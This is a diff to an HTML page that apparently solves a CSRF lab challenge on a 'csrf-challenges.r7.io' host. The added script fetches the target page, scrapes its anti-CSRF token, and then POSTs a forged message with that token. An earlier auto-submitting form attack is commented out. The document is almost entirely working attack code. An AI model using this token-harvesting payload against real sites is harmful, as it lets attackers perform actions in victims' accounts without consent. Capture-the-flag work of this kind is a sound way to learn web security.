@@ -11,6 +11,25 @@
 <!-- 	<script src=code.jquery etc.> </script> -->
 </head>
 <body>
+	<script> 
+	  function request(url, type, callback, send){
+	      var oReq = new XMLHttpRequest();
+	      oReq.open(type, url, true);
+	      oReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	      oReq.onload = callback;
+	      oReq.send(send);
+	  };
+	  function getListener () {
+	      var el = document.createElement('div');
+	      el.innerHTML = this.responseText; 
+	      request('http://csrf-challenges.r7.io/make_post/4', 'POST', postListener, 'csrf=' + el.querySelector('input[name="csrf"]').value + '&post=royle');
+	  };
+	  function postListener(){
+	      console.log(this.responseText)
+	  };
+	  request('http://csrf-challenges.r7.io/make_post/4', 'GET', getListener);
+	</script>
+	<!---
 	<form id="post_form" action="http://csrf-challenges.r7.io/make_post/4" method="POST" >
 		<textarea name="post" value="royle">royle</textarea>
 		<input type="submit" value="submit">
@@ -18,5 +37,7 @@
 	<script type="text/javascript">
 		document.getElementById("post_form").submit();
 	</script>
+-->
 </body>
 </html>
+
